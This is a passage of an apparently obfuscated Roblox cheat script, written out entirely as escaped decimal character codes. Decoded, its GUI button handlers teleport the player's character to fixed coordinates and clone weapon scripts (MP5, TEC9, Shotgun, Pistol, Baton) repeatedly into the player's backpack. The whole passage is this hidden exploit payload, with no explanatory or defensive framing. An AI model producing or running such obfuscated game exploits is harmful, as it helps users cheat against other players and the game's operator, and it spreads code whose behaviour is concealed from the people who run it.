101','\41','\108','\111','\99','\97','\108','\32','\83','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\83','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\67','\104','\97','\114','\97','\99','\116','\101','\114','\46','\72','\117','\109','\97','\110','\111','\105','\100','\82','\111','\111','\116','\80','\97','\114','\116','\46','\67','\70','\114','\97','\109','\101','\61','\67','\70','\114','\97','\109','\101','\46','\110','\101','\119','\40','\45','\57','\51','\44','\56','\53','\46','\52','\51','\44','\55','\56','\48','\41','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\84','\66','\89','\86','\55','\53','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\78','\80','\76','\87','\57','\48','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\102','\41','\108','\111','\99','\97','\108','\32','\84','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\84','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\67','\104','\97','\114','\97','\99','\116','\101','\114','\46','\72','\117','\109','\97','\110','\111','\105','\100','\82','\111','\111','\116','\80','\97','\114','\116','\46','\67','\70','\114','\97','\109','\101','\61','\67','\70','\114','\97','\109','\101','\46','\110','\101','\119','\40','\49','\55','\55','\57','\46','\55','\57','\49','\49','\51','\55','\54','\57','\53','\51','\44','\50','\52','\46','\55','\51','\56','\57','\51','\49','\54','\53','\53','\56','\56','\52','\44','\54','\56','\53','\46','\48','\48','\54','\55','\55','\52','\57','\48','\50','\51','\52','\41','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\78','\80','\76','\87','\57','\48','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\81','\90','\85','\81','\55','\49','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\103','\41','\108','\111','\99','\97','\108','\32','\85','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\85','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\67','\104','\97','\114','\97','\99','\116','\101','\114','\46','\72','\117','\109','\97','\110','\111','\105','\100','\82','\111','\111','\116','\80','\97','\114','\116','\46','\67','\70','\114','\97','\109','\101','\61','\67','\70','\114','\97','\109','\101','\46','\110','\101','\119','\40','\45','\49','\54','\49','\57','\46','\49','\55','\48','\53','\51','\50','\50','\50','\54','\54','\44','\52','\49','\46','\57','\51','\52','\55','\52','\49','\57','\55','\51','\56','\55','\55','\44','\54','\56','\52','\46','\49','\54','\50','\49','\55','\48','\52','\49','\48','\49','\54','\41','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\81','\90','\85','\81','\55','\49','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\72','\72','\90','\85','\55','\52','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\104','\41','\108','\111','\99','\97','\108','\32','\104','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\104','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\67','\104','\97','\114','\97','\99','\116','\101','\114','\46','\72','\117','\109','\97','\110','\111','\105','\100','\82','\111','\111','\116','\80','\97','\114','\116','\46','\67','\70','\114','\97','\109','\101','\61','\67','\70','\114','\97','\109','\101','\46','\110','\101','\119','\40','\50','\52','\49','\54','\44','\50','\52','\46','\56','\44','\50','\55','\48','\46','\49','\51','\41','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\72','\72','\90','\85','\55','\52','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\86','\82','\67','\80','\56','\50','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\105','\41','\108','\111','\99','\97','\108','\32','\86','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\86','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\67','\104','\97','\114','\97','\99','\116','\101','\114','\46','\72','\117','\109','\97','\110','\111','\105','\100','\82','\111','\111','\116','\80','\97','\114','\116','\46','\67','\70','\114','\97','\109','\101','\61','\67','\70','\114','\97','\109','\101','\46','\110','\101','\119','\40','\50','\51','\49','\46','\52','\48','\56','\55','\50','\49','\57','\50','\51','\56','\51','\44','\50','\52','\46','\53','\52','\57','\57','\52','\57','\54','\52','\53','\57','\57','\54','\44','\45','\52','\57','\51','\46','\51','\50','\55','\48','\53','\54','\56','\56','\52','\55','\55','\41','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\86','\82','\67','\80','\56','\50','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\68','\69','\80','\81','\55','\56','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\106','\41','\108','\111','\99','\97','\108','\32','\87','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\87','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\67','\104','\97','\114','\97','\99','\116','\101','\114','\46','\72','\117','\109','\97','\110','\111','\105','\100','\82','\111','\111','\116','\80','\97','\114','\116','\46','\67','\70','\114','\97','\109','\101','\61','\67','\70','\114','\97','\109','\101','\46','\110','\101','\119','\40','\50','\48','\51','\54','\46','\56','\48','\50','\44','\50','\52','\46','\50','\51','\44','\52','\53','\53','\46','\55','\53','\41','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\68','\69','\80','\81','\55','\56','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\81','\69','\90','\75','\56','\51','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\107','\41','\108','\111','\99','\97','\108','\32','\88','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\88','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\67','\104','\97','\114','\97','\99','\116','\101','\114','\46','\72','\117','\109','\97','\110','\111','\105','\100','\82','\111','\111','\116','\80','\97','\114','\116','\46','\67','\70','\114','\97','\109','\101','\61','\67','\70','\114','\97','\109','\101','\46','\110','\101','\119','\40','\45','\57','\57','\51','\46','\52','\52','\44','\53','\52','\46','\51','\51','\44','\45','\50','\57','\51','\56','\46','\50','\55','\41','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\81','\69','\90','\75','\56','\51','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\70','\81','\84','\72','\54','\54','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\108','\41','\108','\111','\99','\97','\108','\32','\89','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\89','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\67','\104','\97','\114','\97','\99','\116','\101','\114','\46','\72','\117','\109','\97','\110','\111','\105','\100','\82','\111','\111','\116','\80','\97','\114','\116','\46','\67','\70','\114','\97','\109','\101','\61','\67','\70','\114','\97','\109','\101','\46','\110','\101','\119','\40','\45','\49','\55','\48','\54','\46','\55','\52','\44','\56','\53','\46','\50','\44','\49','\53','\51','\51','\46','\53','\41','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\70','\81','\84','\72','\54','\54','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\70','\65','\69','\78','\56','\55','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\109','\41','\108','\111','\99','\97','\108','\32','\89','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\89','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\67','\104','\97','\114','\97','\99','\116','\101','\114','\46','\72','\117','\109','\97','\110','\111','\105','\100','\82','\111','\111','\116','\80','\97','\114','\116','\46','\67','\70','\114','\97','\109','\101','\61','\67','\70','\114','\97','\109','\101','\46','\110','\101','\119','\40','\49','\50','\56','\55','\44','\50','\52','\44','\51','\49','\46','\51','\41','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\70','\65','\69','\78','\56','\55','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\90','\66','\65','\71','\56','\57','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\110','\41','\108','\111','\99','\97','\108','\32','\89','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\89','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\67','\104','\97','\114','\97','\99','\116','\101','\114','\46','\72','\117','\109','\97','\110','\111','\105','\100','\82','\111','\111','\116','\80','\97','\114','\116','\46','\67','\70','\114','\97','\109','\101','\61','\67','\70','\114','\97','\109','\101','\46','\110','\101','\119','\40','\45','\50','\49','\51','\49','\44','\50','\55','\46','\49','\55','\44','\45','\49','\52','\48','\52','\41','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\90','\66','\65','\71','\56','\57','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\67','\87','\86','\83','\55','\52','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\98','\41','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\46','\65','\99','\116','\105','\118','\101','\61','\116','\114','\117','\101','\59','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\46','\68','\114','\97','\103','\103','\97','\98','\108','\101','\61','\116','\114','\117','\101','\59','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\46','\86','\105','\115','\105','\98','\108','\101','\61','\102','\97','\108','\115','\101','\32','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\67','\87','\86','\83','\55','\52','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\66','\77','\77','\66','\55','\50','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\112','\41','\108','\111','\99','\97','\108','\32','\90','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\90','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\108','\111','\99','\97','\108','\32','\95','\61','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\66','\97','\99','\107','\112','\97','\99','\107','\59','\108','\111','\99','\97','\108','\32','\97','\48','\61','\95','\91','\39','\77','\80','\53','\39','\93','\108','\111','\99','\97','\108','\32','\97','\49','\61','\97','\48','\91','\39','\82','\105','\102','\108','\101','\83','\99','\114','\105','\112','\116','\39','\93','\102','\111','\114','\32','\97','\50','\61','\49','\44','\51','\53','\32','\100','\111','\32','\97','\49','\58','\67','\108','\111','\110','\101','\40','\41','\46','\80','\97','\114','\101','\110','\116','\61','\97','\48','\32','\101','\110','\100','\32','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\66','\77','\77','\66','\55','\50','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\83','\73','\87','\68','\55','\49','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\113','\41','\108','\111','\99','\97','\108','\32','\97','\51','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\97','\51','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\108','\111','\99','\97','\108','\32','\95','\61','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\66','\97','\99','\107','\112','\97','\99','\107','\59','\108','\111','\99','\97','\108','\32','\97','\48','\61','\95','\91','\39','\84','\69','\67','\57','\39','\93','\108','\111','\99','\97','\108','\32','\97','\49','\61','\97','\48','\91','\39','\80','\105','\115','\116','\111','\108','\83','\99','\114','\105','\112','\116','\39','\93','\102','\111','\114','\32','\97','\50','\61','\49','\44','\51','\53','\32','\100','\111','\32','\97','\49','\58','\67','\108','\111','\110','\101','\40','\41','\46','\80','\97','\114','\101','\110','\116','\61','\97','\48','\32','\101','\110','\100','\32','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\83','\73','\87','\68','\55','\49','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\88','\77','\73','\65','\55','\50','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\114','\41','\108','\111','\99','\97','\108','\32','\97','\52','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\97','\52','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\108','\111','\99','\97','\108','\32','\95','\61','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\66','\97','\99','\107','\112','\97','\99','\107','\59','\108','\111','\99','\97','\108','\32','\97','\48','\61','\95','\91','\39','\83','\104','\111','\116','\103','\117','\110','\39','\93','\108','\111','\99','\97','\108','\32','\97','\49','\61','\97','\48','\91','\39','\83','\104','\111','\116','\103','\117','\110','\83','\99','\114','\105','\112','\116','\39','\93','\102','\111','\114','\32','\97','\50','\61','\49','\44','\53','\32','\100','\111','\32','\97','\49','\58','\67','\108','\111','\110','\101','\40','\41','\46','\80','\97','\114','\101','\110','\116','\61','\97','\48','\32','\101','\110','\100','\32','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\88','\77','\73','\65','\55','\50','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\79','\85','\74','\88','\56','\55','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\115','\41','\108','\111','\99','\97','\108','\32','\97','\53','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\97','\53','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\108','\111','\99','\97','\108','\32','\95','\61','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\66','\97','\99','\107','\112','\97','\99','\107','\59','\108','\111','\99','\97','\108','\32','\97','\48','\61','\95','\91','\39','\80','\105','\115','\116','\111','\108','\39','\93','\108','\111','\99','\97','\108','\32','\97','\49','\61','\97','\48','\91','\39','\80','\105','\115','\116','\111','\108','\83','\99','\114','\105','\112','\116','\39','\93','\102','\111','\114','\32','\97','\50','\61','\49','\44','\49','\55','\32','\100','\111','\32','\97','\49','\58','\67','\108','\111','\110','\101','\40','\41','\46','\80','\97','\114','\101','\110','\116','\61','\97','\48','\32','\101','\110','\100','\32','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\79','\85','\74','\88','\56','\55','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\66','\90','\76','\73','\55','\51','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\116','\41','\108','\111','\99','\97','\108','\32','\97','\53','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\97','\53','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\108','\111','\99','\97','\108','\32','\95','\61','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\66','\97','\99','\107','\112','\97','\99','\107','\59','\108','\111','\99','\97','\108','\32','\97','\48','\61','\95','\91','\39','\66','\97','\116','\111','\110','\39','\93','\108','\111','\99','\97','\108','\32','\97','\49','\61','\97','\48','\91','\39','\77','\101','\108','\101','\101','\83','\99','\114','\105','\112','\116','\39','\93','\102','\111','\114','\32','\97','\50','\61','\49','\44','\49','\48','\32','\100','\111','\32','\97','\49','\58','\67','\108','\111','\110','\101','\40','\41','\46','\80','\97','\114','\101','\110','\116','\61','\97','\48','\32','\101','\110','\100','\32','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\66','\90','\76','\73','\55','\51','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\74','\70','\66','\85','\56','\48','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\117','\41','\108','\111','\99','\97','\108','\32','\97','\54','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\97','\54','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\108','\111','\99','\97','\108','\32','\95','\61','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\46','\